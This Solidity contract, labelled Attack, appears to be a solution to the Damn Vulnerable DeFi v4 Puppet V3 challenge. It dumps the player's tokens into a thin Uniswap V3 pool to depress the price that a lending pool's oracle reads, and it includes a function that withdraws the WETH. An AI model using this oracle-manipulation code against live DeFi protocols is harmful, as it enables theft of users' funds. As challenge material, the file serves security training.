// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {TransferHelper} from "@uniswap/v3-core/contracts/libraries/TransferHelper.sol";
import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import {PuppetV3Pool} from "./PuppetV3Pool.sol";
import {INonfungiblePositionManager} from "./INonfungiblePositionManager.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";

interface IUniswapV3SwapCallback {
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

contract Attack is IUniswapV3SwapCallback{
    PuppetV3Pool public immutable pool;
    DamnValuableToken public immutable token;
    IUniswapV3Pool public immutable uniswap;
    WETH public immutable weth;
    address public immutable recovery;


    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint24 constant FEE = 3000;
    
    error Merde(uint256);
    
    constructor(PuppetV3Pool _pool, DamnValuableToken _token, IUniswapV3Pool _uniswap, WETH _weth, address _recovery) {
        token = _token;
        uniswap = _uniswap;
        pool = _pool;
        recovery = _recovery;
        weth = _weth;
    }

    function attack() public payable {
        (uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked) = uniswap.slot0();
        uint160 sqrtPriceLimitX96 = TickMath.MIN_SQRT_RATIO + 1;
        require(sqrtPriceLimitX96 < sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO, 'KEK');
        token.approve(address(uniswap), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswap.swap(
            address(this),
            true,
            int256(PLAYER_INITIAL_TOKEN_BALANCE),
            sqrtPriceLimitX96,
            ""
        );
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        if (amount0Delta > 0) token.transfer(address(uniswap), uint256(amount0Delta));
    }

    function getETH() public {
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }
}